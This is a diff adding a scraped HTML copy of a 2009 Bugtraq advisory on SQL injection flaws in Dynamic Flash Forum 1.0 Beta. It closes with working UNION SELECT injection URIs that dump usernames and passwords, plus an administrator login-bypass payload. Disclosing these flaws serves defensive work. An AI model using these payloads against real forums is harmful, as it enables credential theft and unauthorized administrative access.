@@ -1,0 +1,95 @@
+#SpeeDr00t@Black Falcon<br>#bid34465<p><b><span style="font-size: 18pt;">Dynamic Flash Forum Multiple SQL Injection Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/34465/info">info</a><br><a href="http://www.securityfocus.com/bid/34465/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/34465/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/34465/solution">solution</a><br><a href="http://www.securityfocus.com/bid/34465/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				34465
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Apr 09 2009 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Apr 13 2009 07:06PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Salvatore "drosophila" Fresta
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Dynamic Flash Forum Dynamic Flash Forum  1.0 Beta<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	Attackers can use a browser to exploit these issues.<br/><br/>The following example URIs and data are available:<br/><br/>http://www.example.com/path/viewprofile.php?userID=-1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,GROUP_CONCAT(CONCAT(username, 0x3a, password)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM users%23<br/>http://www.example.com/path/viewmessage.php?threadID=-1' UNION ALL SELECT NULL,NULL,NULL,NULL,GROUP_CONCAT(CONCAT(username, 0x3a, password)),NULL,NULL,NULL FROM users%23<br/>http://www.example.com/path/viewthreads.php?boardID=-1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,GROUP_CONCAT(CONCAT(username, 0x3a, password)) FROM users%23<br/><br/>Username: -1' UNION ALL SELECT 'password', 1, 'Administrator' FROM users%23<br/>Password: password
+	
+		<ul>
+</ul>
+</div>
